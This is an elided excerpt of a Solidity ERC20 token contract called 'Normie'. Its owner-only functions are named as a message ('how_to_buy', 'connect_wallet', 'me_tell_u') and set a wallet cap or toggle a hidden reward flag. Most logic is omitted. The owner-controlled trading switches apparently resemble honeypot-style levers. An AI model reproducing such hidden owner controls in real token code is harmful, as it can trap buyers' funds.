...
contract Normie is ERC20, Ownable {
    ...
    constructor() ERC20("How to buy", "Normie") {
     ...
     */
    function uniswap_org() external onlyOwner {
     ...
     */
    function buy(uint256 deadblock) external onlyOwner {
     ...
     */
    function connect_wallet(uint256 newNum) external onlyOwner {
        require(
    ...
    function paste_contract_address(uint256 newNum) external onlyOwner {
        maxWallet = newNum;
    }
    ...
    function do_not_snipe(bool value) external onlyOwner {
        _nodeReward = value;
    }

    function yo(bool value) external onlyOwner {
        _nodeReward = value;
    }

    function me_tell_u(bool value) external onlyOwner {
        _nodeReward = value;
    }

    function how_to_buy(bool value) external onlyOwner {
        _nodeReward = value;
    }
